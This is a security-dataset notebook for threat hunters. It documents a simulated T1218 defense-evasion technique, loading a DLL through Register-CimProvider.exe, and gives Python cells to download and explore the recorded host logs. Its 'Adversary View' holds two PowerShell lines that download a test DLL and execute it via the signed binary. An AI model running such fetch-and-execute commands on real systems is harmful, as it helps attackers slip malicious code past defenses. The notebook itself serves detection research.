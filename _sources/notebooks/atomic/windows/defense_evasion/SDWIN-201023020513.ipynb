{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d1a990fb",
   "metadata": {},
   "source": [
    "# Register-CimProvider Execute Dll"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "14221664",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cd79a181",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/10/23 |\n",
    "| Modification Date | 2020/10/23 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1218](https://attack.mitre.org/techniques/T1218) |\n",
    "| Tags              | None |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "464736c4",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents threat actors leveraging Register-Cimprovider to execute a malicious Dll."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f5668c2d",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e6cf3237",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_register_cimprovider_execute_dll.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_register_cimprovider_execute_dll.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "aa5cb489",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0ab024fd",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9489be11",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | PowerShell | [PowerShell](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md#atomic-test-3---register-cimprovider---execute-evil-dll) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "daab9f25",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "PS >Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll\" -OutFile C:\\ProgramData\\T1218-2.dll\n",
    "PS > C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path C:\\ProgramData\\T1218-2.dll\n",
    "\n",
    "'Namespace' is not specified.\n",
    "'ProviderName' is not specified.\n",
    "Failed to load provider 'C:\\ProgramData\\T1218-2.dll'. Failure code 0x8007045A.\n",
    "\n",
    "Try 'Register-CimProvider.exe -help' for help.\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f56394a7",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "77ed1f0c",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8e3b7284",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_register_cimprovider_execute_dll.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6a238b60",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e61aaf52",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "41c85672",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "caf67c78",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b10e4cf8",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md#atomic-test-3---register-cimprovider---execute-evil-dll](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md#atomic-test-3---register-cimprovider---execute-evil-dll) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
